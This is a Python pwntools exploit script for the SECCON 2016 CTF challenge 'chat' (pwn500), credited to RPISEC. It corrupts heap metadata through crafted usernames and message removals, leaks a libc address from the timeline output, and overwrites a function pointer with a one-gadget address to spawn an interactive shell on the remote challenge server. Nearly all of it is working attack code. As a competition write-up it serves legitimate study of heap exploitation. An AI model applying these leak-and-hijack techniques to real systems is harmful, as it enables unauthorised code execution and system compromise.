"""

SECCON 2016 pwn500 "chat" exploit

    RPISEC - wait_what, itszn

"""

import sys
from pwn import *

def signup(r, name):
    r.readuntil('menu >')
    r.writeline('1')
    r.readuntil('name >')
    r.writeline(name)
    r.readuntil('Success!')

def login(r, name):
    r.readuntil('menu >')
    r.writeline('2')
    r.readuntil('name >')
    r.writeline(name)
    r.readuntil('Success!')

def logout(r):
    r.readuntil('menu >>')
    r.writeline('0')
    r.readuntil('Bye')

def change(r, new_name):
    r.readuntil('menu >>')
    r.writeline('7')
    r.readuntil('name >>')
    r.writeline(new_name)
    #r.readuntil('Done.')

def public(r, msg):
    r.readuntil('menu >>')
    r.writeline('4')
    r.readuntil('message >>')
    r.writeline(msg)
    r.readuntil('Done.')

def direct(r, user, msg):
    r.readuntil('menu >>')
    r.writeline('5')
    r.readuntil('name >>')
    r.writeline(user)
    r.readuntil('message >>')
    r.writeline(msg)
    r.readuntil('Done.')

def remove(r, msg_id):
    r.readuntil('menu >>')
    r.writeline('6')
    r.readuntil('id >>')
    r.writeline(str(msg_id))
    r.readuntil('Done.')

def show_timeline(r):
    r.readuntil('menu >>')
    r.writeline('1')
    return r.readuntil('Done.')

def show_dm(r):
    r.readuntil('menu >>')
    r.writeline('2')
    return r.readuntil('Done.')

def show_userlist(r):
    r.readuntil('menu >>')
    r.writeline('3')
    return r.readuntil('Done.')

def main():
    if len(sys.argv) == 1:
        r = process('./chat')
        raw_input(str(r.proc.pid))
    else:
        if 1:
            r = remote('chat.pwn.seccon.jp', 26895)
        else:
            r = process('ltrace -o trace ./chat', shell=True)
            #r = process('setarch x86_64 -R ltrace -o trace ./chat', shell=True)

    signup(r, 'a')
    signup(r, 'b')

    login(r, 'b')
    public(r, 'A'*100)
    logout(r)
    signup(r, 'c')
    signup(r, '\x40')

    login(r, 'b')
    remove(r, 1)
    change(r, '\x01'+'A'*7 + 'B'*8 + 'C'*8 + p16(0xff1).replace('\0',''))

    login(r, '\x40')

    public(r, '...')
    public(r, 'X'*48 + p32(0x603038) + '\0'*20)

    data = show_timeline(r)
    data = data.split('[',1)[1]
    data = data.split(']',1)[0]
    leak = u64(data+'\0'*(8-len(data)))
    print hex(leak)

    libc = leak - 0x86d40
    print hex(libc)

    change(r, p64(libc + 0x0E5765))

    r.interactive()



if __name__ == '__main__':
    main()


